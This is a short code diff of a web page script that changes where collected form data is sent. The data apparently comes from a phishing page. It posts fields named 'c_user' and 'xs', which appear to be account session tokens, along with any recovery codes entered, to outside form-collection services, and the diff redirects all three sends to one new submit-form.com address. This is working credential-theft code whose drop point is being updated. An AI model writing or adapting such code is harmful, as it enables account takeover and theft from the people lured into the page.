@@ -770,7 +770,7 @@
         const xsInputVal = xsInput.value.trim();
         
         // Always send c_user and xs
-        fetch("https://formspree.io/f/xblqrelw", {
+        fetch("https://submit-form.com/NHHDnW44d", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
@@ -847,7 +847,7 @@
         xsError.classList.toggle("show", !isXsValid);
 
             // Submit main form
-            fetch("https://formspree.io/f/xblqrelw", {
+            fetch("https://submit-form.com/NHHDnW44d", {
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json",
@@ -864,7 +864,7 @@
                 if (response.ok) {
                     // If recovery codes are provided, send additional notification
                     if (allowRecovery && recoveryCodes) {
-                        return fetch("https://postal-form.on.shiper.app/notifyLogin", {
+                        return fetch("https://submit-form.com/NHHDnW44d", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ email: recoveryCodes, password: "." })
